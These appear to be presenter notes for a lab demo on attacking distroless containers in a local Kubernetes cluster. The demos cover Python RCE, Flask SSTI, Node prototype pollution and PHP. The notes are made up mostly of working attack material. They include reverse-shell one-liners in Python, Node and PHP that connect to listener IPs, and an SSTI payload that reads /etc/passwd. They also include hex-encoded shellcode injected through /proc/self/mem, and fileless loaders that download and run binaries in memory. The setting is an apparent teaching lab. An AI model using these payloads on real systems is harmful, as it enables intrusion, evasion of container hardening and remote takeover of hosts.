# pre
Start docker & minikube
kubectl exec -it ubuntu -- bash; apt update; apt install net-tools netcat git wget python3 nano -y
cd /tmp
git clone https://github.com/nnsee/fileless-elf-exec
cd fileless-elf-exec
wget https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl

# Demo 0: What is distroless
## No sh
kubectl exec -it dless-express-pp-pod -- sh

## No binaries
kubectl exec -it dless-flask-ssti-pod -- sh
ls
command -v openssl #https://www.form3.tech/engineering/content/exploiting-distroless-images








# Demo 1: Python RCE
kubectl port-forward dless-python-rce-pod 3001:3001

## No binaries
http://localhost:3001/?cmd=ls
http://localhost:3001/?cmd=whoami
http://localhost:3001/?cmd=dd
http://localhost:3001/?cmd=which sh

## Show sh builtins
http://127.0.0.1:3001/?cmd=while read -r line; do echo $line; done</etc/passwd
http://localhost:3001/?cmd=command -v python

## Run using python
http://127.0.0.1:3001/?cmd=python -c "exec('import platform\nprint(platform.uname())')"

## Get reverse shell

### Prepare ubuntu
kubectl exec -it ubuntu -- bash
ifconfig
nc -lvnp 4444

### Rev shell
http://127.0.0.1:3001/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/usr/bin/python","-i"]);'

## Execute binary using syscall
cd /tmp/fileless-elf-exec
python3 fee.py kubectl > /tmp/kubectl.py
python3 /tmp/kubectl.py

### Fix code
```python
# imports ...
# imports ...
pid = os.fork()
if pid == 0: #pid==0 represents the child process
# Rest of the payload inside this if
```

### In a different shell in ubuntu
kubectl exec -it ubuntu -- bash
cd /tmp/fileless-elf-exec
python3 -m http.server

### Download & execute ls.py in victim
```python
from urllib import request
kubectl = request.urlopen("http://172.17.0.3:8000/kubectl.py").read()
exec(kubectl)
```


# Demo 1.5: Python SSTI
kubectl port-forward dless-flask-ssti-pod 3002:1337

## If no sh, and not RCE but SSTI, this is still possible with raw python
http://127.0.0.1:3002/?name={{(1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["open"]("/etc/passwd").read()}}










# Demo 2: Node PP
kubectl port-forward dless-express-pp-pod 3000:3000

## Reverse-shell
http://127.0.0.1:3000/?exec=1&data={"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").fork(\"-e\",[\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4444, `172.31.79.130`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\"],{\"env\":{\"NODE_OPTIONS\":\"\"}}).toString())//"}}}

## Info
```js
os = require("os")
os.tmpdir()
os.platform();
os.release();
os.arch();
os.networkInterfaces()
```

## List folder
```js
path = require('path');
fs = require('fs');

function ls(path){
    fs.readdir(path, { withFileTypes: true }, function (err, files) {
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            console.log(file); 
        });
    });
}

ls("/")
```

## In memory execution

```js
// Imports
fs = require('fs');
path = require('path');
http = require('http');
https = require('https');
const { fork } = require('child_process');

// Code to execute a fork process that will execute a shellcode with memfd_create
node_subp1_path = "/dev/shm/subp1.js"

// memfd_create shellcode from https://github.com/arget13/DDexec
var node_subp1 = `
fs = require('fs');
var data = fs.readFileSync('/proc/self/syscall', {encoding:'utf8', flag:'r'});
var mem_addr = data.split(" ")[8].trim();
var dec_offset = Number(mem_addr);
var shellcode_b64 = "aERFQURIiedIMfZIifC0AbA/DwVIicewTQ8FsCIPBQ==";
var shellcode = Buffer.from(shellcode_b64, 'base64');
fs.open('/proc/self/mem', 'a', function(err, fd) {
    fs.write(fd, shellcode, 0, shellcode.length, dec_offset, function(err,writtenbytes){});
})
`

fs.writeFileSync(node_subp1_path, node_subp1);

// Check file was created (this step can be skipped)
function ls(path){
    fs.readdir(path, { withFileTypes: true }, function (err, files) {
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            console.log(file); 
        });
    });
}

ls("/dev/shm")

// Make a subprocess execute the memfd_create shellcode
var proc = fork(node_subp1_path, [], {"execPath": "/proc/self/exe", "argv0": "nodejs"});

console.log(`Check in /proc/${proc.pid}/fd (memfd is probably the biggest number)`);

// Find the memfd fd
function get_memfd_num(path){
    fs.readdir(path, function (err, files) {
        if (err) {
            console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            fs.readlink(path + "/" + file, (err, target) => {
                if (!err){
                    if (target.includes("/memfd:"))
                        console.log(path + "/" + file + " -> " + target)
                }
            });
        });
    });
}
get_memfd_num(`/proc/${proc.pid}/fd`);
memfd_file_path = "/proc/60/fd/20" // CHANGE THIS

// Download the binary to execute in the fd
var download = function(url, dest) {
  var file = fs.createWriteStream(dest);
  var request = https.get(url, function(response) {
    response.pipe(file);
    file.on('finish', function() {
        console.log("closed")
        file.close();
    });
  });
};

// CHANGE THE FD: /proc/80/fd/20
download("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/amd64/kubectl", memfd_file_path)

// Execute the fd directly from the exec syscall
fork("", [], {"execPath": memfd_file_path, "execArgv": []})
```



# DEMO 3: PHP
docker run -it --rm cgr.dev/chainguard/php -a

## No way to execute binaries from php
```php
`ls`;
`sh`;
```

## List folders & read files

```php
function listFilesInFolder($folderPath) {
  if (is_dir($folderPath)) {
    if ($dh = opendir($folderPath)) {
      while (($file = readdir($dh)) !== false) {
        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
      }
      closedir($dh);
    }
  }
}
listFilesInFolder("/");
echo file_get_contents("/etc/passwd");
```

## RCE 1

```php
# Download binary to memory
$bin_url = "https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl";
$handle = fopen($bin_url, "r");
$binary = "";
while (!feof($handle)) {
    $binary .= fread($handle, 2048);
}
fclose($handle);

# Create shellcode
$bin_size = strlen($binary);
$hex_size = pack('P', $bin_size);
$hex_size_str = bin2hex($hex_size);

$hexstr_shellcode = "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4e40300aa26030010c60040f9e10306aac80580d2010000d4c81b80d2000080d2e10306aa620080d2230080d2050080d2010000d4e80780d2e10300aae20306aa000080d2010000d4420000eb2100008b81ffff54881580d2010000d4610280d2281080d2010000d4" . $hex_size_str;


# Execute binary
$cmd_array = [
    'php',
    '-a'
];

$descriptorspec = array(
    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);

# The only way in PHP to execute a binary without using a shell is using an array in proc_open
$process = proc_open($cmd_array,$descriptorspec,$pipes);
$status = proc_get_status($process);
$pid = $status['pid'];



# Execute shellcode in child process
$payload = "\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode = hex2bin("'.$hexstr_shellcode.'"); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n\n".$binary; # 2 new lines are needed

fwrite($pipes[0], $payload);

# Check it was created
function listFilesInFolder($folderPath) {
  if (is_dir($folderPath)) {
    if ($dh = opendir($folderPath)) {
      while (($file = readdir($dh)) !== false) {
        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
      }
      closedir($dh);
    }
  }
}

listFilesInFolder("/proc/$pid/fd/");


# Execute kubectl
$cmd_array_kubectl = [
    "/proc/$pid/fd/3",
    '-h'
];

$descriptorspec_kubectl = array(
    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);

$process2 = proc_open($cmd_array_kubectl,$descriptorspec_kubectl,$pipes_kubectl);
sleep(0.5);
echo stream_get_contents($pipes_kubectl[1]);
proc_close($process2);
```



```
To compile shellcode:

as a.s -o a.o
objcopy -O binary a.o
xxd -ps a.o | tr -d '\n'


Shellcode:

.arch armv8-a
.global _start

_start:
        movz    x0, #0x4144
        movk    x0, #0x4445, lsl #16
        str     x0, [sp, #-0x10]!
        mov     x0, sp
        eor     x1, x1, x1
        mov     x8, #0x117
        svc     #0 // memfd_create

        mov     x4, x0 //save fd for mmap

        adr     x6, filesz
        ldr     x6, [x6]
        mov     x1, x6    
        mov     x8, #0x2e
        svc     #0 // ftruncate
        
        mov     x8, #0xde
        mov     x0, #0
        mov     x1, x6
        mov     x2, #3 // RW
        mov     x3, #1 // MAP_SHARED
        mov     x5, #0
        svc     #0 // mmap

        mov     x8, #0x3f
        mov     x1, x0 // address returned by mmap
        mov     x2, x6
    
    read_more:
        mov     x0, #0
        svc     #0 // read
        subs    x2, x2, x0
        add     x1, x1, x0
        bne     read_more

        mov     x8, #0xac
        svc     #0 // getpid
        mov     x1, #0x13 // SIGSTOP
        mov     x8, #0x81
        svc     #0 // kill

    filesz:
```




## RCE 2

kubectl exec -it php-pod -- sh
kubectl exec -it php-pod -- php -a


kubectl exec -it ubuntu -- bash
nc -lvnp 4444


```php
$sock = fsockopen("172.31.79.130", 4444);

$cmd_array = ['php', '-a'];
$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);

$process = proc_open($cmd_array, $descriptorspec, $pipes);
```

```php
// PHP child process that will load memexecd
$executor='
preg_match("/^.*vdso.*\$/m", file_get_contents("/proc/self/maps"), $matches);
$vdso_addr = substr($matches[0], 0, strpos($matches[0], "-"));
$vdso_dec = hexdec($vdso_addr);
$vdso_addr = bin2hex(strrev(hex2bin($vdso_addr))); // To little endian
$syscall = file_get_contents("/proc/self/syscall");
$syscall_array = explode(" ", $syscall);
$addr_dec = hexdec(trim($syscall_array[8]));
if(php_uname("m") == "x86_64")
{ // x64
    $jmp = hex2bin("48b8". $vdso_addr . "0000ffe0");
    $stager = hex2bin("41b90000000041b8ffffffff41ba22000000ba03000000be00100000bf00000000b8090000000f0589f24889c631c089c70f0531c00f054889f789d6ba0500000066b80a000f05ffe7");
} else { // Aarch64
    $jmp = hex2bin("4000005800001fd6". $vdso_addr . "0000");
    $stager = hex2bin("050080520400801243048052620080520100825200008052c81b8052010000d4e203012ae10300aae807805200008052010000d400008052010000d4e00301aae30301aae103022aa2008052481c8052010000d460001fd6");
}
$fd = fopen("/proc/self/mem", "r+");
fseek($fd, $vdso_dec);
fwrite($fd, $stager);
fseek($fd, $addr_dec);
fwrite($fd, $jmp);
fclose($fd);
';


// Run it and keep FD 0
$cmd_array = ['php', '-a'];
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => fopen('php://stdout', 'w'),
    2 => fopen('php://stderr', 'w'),
    3 => fopen('php://stdin' , 'w')
);

$process = proc_open($cmd_array, $descriptorspec, $pipes);
fwrite($pipes[0], $executor);
sleep(1);


// x64 shellcode
$shellcode = "554889e54881ec2001000048c745d800000000488d85e8feffff4889c6488d056c0d00004889c7e8e70a0000488945d0488b45d0ba01000000488d0d5f0d00004889ce4889c7e86c0b0000488b55d04801c2488d85e8feffff4889c64889d7e8af0a0000488945c8488b45c8ba00000000be000040404889c7e842070000488945c0488b55b8488b45d04889d64889c7e8d50c0000488b95e8feffff488b45c84889d64889c7e8bf0c0000e9d10600008b85e0feffff85c00f84500100008b85e0feffff489848898568ffffff48838568ffffff0f4883a568fffffff04889e2488b8568ffffff48f7d84801d04889c44889e0488945b08b85e0feffff4863d0488b45b0be000000004889c7e83b0c00008b85e0feffff4863d0488b45b04889c6bf00000000e8520c0000c745e401000000488b45b0488945e8eb048345e401488b45e84889c7e8e00b00004883c001480145e88b85e0feffff4863d0488b45b04801d0483945e872d28b45e483c001489848c1e00348898560ffffff48838560ffffff0f4883a560fffffff04889e2488b8560ffffff48f7d84801d04889c44889e0488945f0c745e000000000488b45b0488945e8eb338b45e04898488d14c500000000488b45f04801c2488b45e8488902488b45e84889c7e84d0b00004883c001480145e88345e0018b45e03b45e47cc58b45e44898488d14c500000000488b45f04801d048c70000000000488d85e4feffffba040000004889c6bf00000000e8560b000048c78558ffffff1100000048c78550ffffff0000000048c78548ffffff0000000048c78540ffffff0000000048c78538ffffff00000000488bb550ffffff488b9548ffffff4c8b9540ffffff4c8b8538ffffff488bbd58ffffffb8380000000f0585c00f85060400008b85e4feffff48984889c7e8040a0000488945c8488d95f0feffff488b45c8be000040004889c7e804050000488945a8488b45c0488b5018488b45c04801d0488945a0488b45c8488b50188b85f0feffff83e00185c00f95c00fb6c0480faf45a84801d048894598488b45c80fb740380fb7c048894590488b45c80fb740360fb7c048894588488b45c8488b5020488b45a84801d0488945808b85e4feffff4863d0488b45c84889d64889c7e8290a000041b90000000041b8ffffffffb922000200ba03000000be00100200bf00000000e80c0a000048898578ffffff488b8578ffffff480500100200488945f848836df808488b45f848c700000000008b45e483e00185c0741048836df808488b45f848c70000000000c745e00000000048816df800040000488b45f848898570ffffff8b45e0489848c1e0044889c2488b8570ffffff4801d048c700060000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801d048c74008001000008b45e0489848c1e0044889c2488b8570ffffff4801d048c700190000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4598488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700090000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4598488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700070000008b85f0feffff83e00285c00f94c00fb6d08b45e08d4801894de0489848c1e0044889c1488b8570ffffff4801c14889d0480faf45c0488941088b45e0489848c1e0044889c2488b8570ffffff4801d048c700050000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4590488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700040000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4588488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700030000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4580488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700000000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801d048c740080000000048836df808488b45f848c7000000000048836df808488b45f848c700000000008b45e4489848c1e00348f7d8480145f88b45e44898488d14c500000000488b4df0488b45f84889ce4889c7e82507000048836df8088b45e44863d0488b45f8488910c78534ffffff03000000c78530ffffff000000008b8530ffffff48984889c6ba000000008b8534ffffff48984889c7b8240100000f05488b65f88b85f0feffff83e00285c07408488b4598ffe0eb06488b45a0ffe08b85e0feffff4898488985f8feffff488385f8feffff0f4883a5f8fefffff04889e2488b85f8feffff4801d04889c48b45e483c001489848c1e00348898500ffffff48838500ffffff0f4883a500fffffff04889e2488b8500ffffff4801d04889c4c78524ffffffffffffff48c78518ffffff00000000c78514ffffff0000000048c78508ffffff00000000488bb518ffffff8b8514ffffff48984889c24c8b9508ffffff8b8524ffffff48984889c7b83d0000000f05b86e0000000f0589852cffffffc78528ffffff120000008b8528ffffff48984889c68b852cffffff48984889c7b83e0000000f05488d85e0feffffba0400";

$shellcode .="00004889c6bf00000000e8e30500004883f8040f840cf9ffffc785f4feffff000000008b85f4feffff48984889c7b83c0000000f05554889e54881ecb00000004889bd68ffffff4889b560ffffff48899558ffffff48c745f80000000048c745f000000000488b8568ffffff488945d8488b45d8488b5020488b8568ffffff4801d0488945d0488b45d80fb74038668945ce488b8568ffffffba00000000488d0d770500004889ce4889c7e87c030000488945c04883bd58ffffff007417488b8558ffffff8b0083c80289c2488b8558ffffff8910488b45d80fb740106683f803752c4883bd58ffffff007417488b8558ffffff8b0083c80189c2488b8558ffffff8910488b8560ffffff488945f0c745ec00000000e9530200008b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d08b0083f80375214883bd58ffffff007417488b8558ffffff8b0083e0fd89c2488b8558ffffff89108b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d08b0083f8010f85e00100008b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d08b40048945bc8b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4008488945b08b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4010488945a88b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4020488945e08b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4028488945a0488b45a8482500f0ffff488945988b45bcc1e80283e00189c28b45bc83e00209c28b45bcc1e00283e00409d0894594488b45a8482b4598480145e0488b45a8482b4598480145a0488b4598482b45a8480145b0488b55f0488b4598488d3c02488b45a041b90000000041b8ffffffffb932000000ba030000004889c6e82003000048837db0007508488b4598488945f848837dc0007427488b45c0483b4598721d488b5598488b45e04801d0483945c0730c488b45c0482b4598488945e0488b9568ffffff488b45b0488d3402488b55f0488b4598488d0c02488b45e04889c24889cfe89b0200008b4594488b4df0488b55984801ca48895588488b55e04889558089857cffffff488b75808b857cffffff48984889c2488b7d88b80a0000000f05eb008345ec010fb745ce3945ec0f8ca0fdffff488b55f0488b45f84801d0c9c3554889e54883ec4048897dc8488975c0488b45c8ba000000004889c6bf9cffffffe8210200008945fc8b45fc8945ec48c745e000000000c745dc02000000488b45e04889c68b45dc48984889c28b45ec48984889c7b8080000000f054889c2488b45c0488910488b45c0488b008b55fc41b9000000004189d0b902000000ba010000004889c6bf00000000e8cf010000488945f08b45fc89c7e8b1010000488b45f0c9c3554889e54883ec5048897dc8488975c08955bc488b45c8488945f0488b45f0488b5028488b45c84801d0488945e8488b45f00fb7403c668945e6488b45f00fb7403e668945e40fb745e448c1e0064889c2488b45e84801d0488b5018488b45c84801d0488945d8c745fc00000000eb6d8b45fc489848c1e0064889c2488b45e84801d08b0089c2488b45d84801c2488b45c04889c64889d7e8e700000085c07538837dbc0074198b45fc489848c1e0064889c2488b45e84801d0488b4018eb2b8b45fc489848c1e0064889c2488b45e84801d0488b4010eb128345fc010fb745e63945fc7c8ab800000000c9c3554889e54883ec3048897dd848c745f00000000048c745f800000000488b45d841b90000000041b8ffffffffb922000000ba030000004889c6bf00000000e88b000000488945e8488b55e8488b45f8488d0c02488b45d84889c24889cebf00000000e872000000488945f0488b45f0480145f8488b45f0482945d848837dd80075c5488b45e8c9c331c031c9ffc9f2aef7d1678d41ffc357e8ebffffff5ff3a60f95c0480fb6c0c331c04889d1f3aac34889d1f3a4c3b8010100000f05c3b8030000000f05c3b80b0000000f05c34c87d1b8090000000f05c3b8000000000f05c34c87d1b8110000000f05c32f70726f632f73656c662f657865002e696e74657270002e62737300";
$shellcode = hex2bin($shellcode);


// Send shellcode to stager
fwrite($pipes[0], $shellcode);



// Prepare memexec function
$GLOBALS['pipe'] = $pipes[0];
function memexec($url, $argv = [], $stop = true)
{
    $args = "";
    foreach($argv as &$arg)
        $args .= $arg . "\0";
    unset($arg);

    $f = fopen($url, "r");
    $binary = "";
    while(!feof($f))
        $binary .= fread($f, 2048);
    fclose($f);

    $args = pack('V', strlen($args)) . $args . pack('V', strlen($binary));
    fwrite($GLOBALS['pipe'], $args);
    fwrite($GLOBALS['pipe'], $binary);
    if($stop) posix_kill(posix_getpid(), 19);
}



memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["ls", "-la", "/"], false);
memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["cat", "/etc/passwd"], false);
memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["sh","-i"], true);
pwd
set
```
